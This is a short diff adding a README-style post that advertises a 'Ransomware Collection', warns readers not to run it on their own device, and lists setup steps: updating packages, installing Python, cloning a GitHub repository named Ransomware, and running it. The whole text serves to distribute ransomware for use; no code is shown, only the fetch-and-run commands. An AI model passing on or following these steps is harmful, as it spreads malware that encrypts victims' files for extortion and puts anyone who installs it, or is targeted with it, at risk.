@@ -1,0 +1,18 @@
+🔰 Ransomware Virus 
+━━━━━━━━━━━━━━━━━━
+Ransomware Collection. Do Not Run These on Your Device. ☢
+━━━━━━━━━━━━━━━━━━
+Setup:
+
+• apt update && apt upgrade -y
+
+• apt install python python2 python3 -y
+
+• git clone https://github.com/Err0r-ICA/Ransomware
+
+• CD Ransomware
+
+• python3 Ransomware
+
+• help
+ (It is not stolen, it was edited and shared by me.)
